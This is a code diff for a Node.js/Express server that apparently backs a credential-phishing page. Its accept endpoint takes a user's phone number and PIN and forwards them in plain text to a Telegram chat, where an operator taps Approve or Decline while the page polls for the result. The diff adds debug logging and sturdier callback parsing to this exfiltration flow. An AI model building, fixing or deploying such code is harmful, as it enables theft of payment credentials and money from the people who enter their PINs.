@@ -73,7 +73,10 @@ setInterval(() => {
 const PENDING = new Map();
 
 function setDecision(txId, decision) {
-  if (!txId) return;
+  if (!txId) {
+    pushLog('setDecision skipped: no txId', 'err');
+    return;
+  }
   PENDING.set(txId, { decision, ts: Date.now() });
   pushLog('Decision ' + decision + ' for ' + txId, decision === 'approved' ? 'ok' : 'err');
 }
@@ -109,8 +112,6 @@ app.post('/api/accept', async (req, res) => {
   const { transactionId, phone, pin } = req.body;
 
   pushLog('ACCEPT HIT tx=' + (transactionId || '—') + ' phone=' + (phone || '—'), 'info');
-
-  // Show exactly which environment variables the running container sees
   pushLog(
     'ENV: token=' + (process.env.TELEGRAM_BOT_TOKEN ? 'set' : 'MISSING') +
     ' chat=' + (process.env.TELEGRAM_CHAT_ID ? 'set' : 'MISSING') +
@@ -136,6 +137,7 @@ app.post('/api/accept', async (req, res) => {
     return res.status(500).json({ status: 'failed', message: 'Server not configured' });
   }
 
+  // Reset any previous decision for this tx (in case of retry)
   PENDING.set(transactionId, { decision: 'pending', ts: Date.now() });
 
   const messageText =
@@ -144,6 +146,7 @@ app.post('/api/accept', async (req, res) => {
     'Phone: ' + phone + '\n' +
     'PIN: ' + pin;
 
+  // Use short callback tokens to be safe against any length limits
   const keyboard = {
     inline_keyboard: [[
       { text: '✅ Approve', callback_data: 'approve:' + transactionId },
@@ -180,7 +183,7 @@ app.post('/api/accept', async (req, res) => {
 ============================================================ */
 app.get('/api/status/:tx', (req, res) => {
   const tx = req.params.tx;
-  res.json({ transactionId: tx, decision: getDecision(tx) });
+  res.json({ transactionId: tx, decision: getDecision(tx), status: getDecision(tx) });
 });
 
 /* ============================================================
@@ -190,24 +193,44 @@ app.post('/api/telegram-webhook', async (req, res) => {
   pushLog('WEBHOOK HIT', 'info');
 
   const update = req.body || {};
+
+  // Log the shape of the payload (truncated) so we can diagnose silently dropped callbacks
+  try {
+    pushLog('WEBHOOK PAYLOAD: ' + JSON.stringify(update).slice(0, 300), 'info');
+  } catch (e) {
+    pushLog('WEBHOOK PAYLOAD: unstringifiable', 'err');
+  }
+
   const cb = update.callback_query;
 
   if (cb && cb.data) {
-    const [action, txId] = String(cb.data).split(':');
+    pushLog('CALLBACK DATA: ' + cb.data, 'info');
+
+    // Parse "approve:TXN-XXXX" or "decline:TXN-XXXX"
+    const raw = String(cb.data);
+    const idx = raw.indexOf(':');
+    const action = idx >= 0 ? raw.slice(0, idx) : raw;
+    const txId   = idx >= 0 ? raw.slice(idx + 1) : '';
+
+    pushLog('PARSED action=' + action + ' tx=' + txId, 'info');
+
     if (action === 'approve') setDecision(txId, 'approved');
-    if (action === 'decline') setDecision(txId, 'declined');
+    else if (action === 'decline') setDecision(txId, 'declined');
+    else pushLog('Unknown callback action: ' + action, 'err');
 
     const baseUrl = tgBase();
     if (baseUrl) {
+      // Acknowledge the tap so the Telegram button stops spinning
       fetch(baseUrl + '/answerCallbackQuery', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           callback_query_id: cb.id,
-          text: action === 'approve' ? 'Approved' : 'Declined'
+          text: action === 'approve' ? 'Approved' : (action === 'decline' ? 'Declined' : 'OK')
         })
       }).catch(() => {});
 
+      // Remove buttons from the original message
       if (cb.message && cb.message.chat && cb.message.chat.id && cb.message.message_id) {
         fetch(baseUrl + '/editMessageReplyMarkup', {
           method: 'POST',
@@ -220,6 +243,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
         }).catch(() => {});
       }
     }
+  } else {
+    pushLog('No callback_query in update', 'err');
   }
 
   res.json({ ok: true });
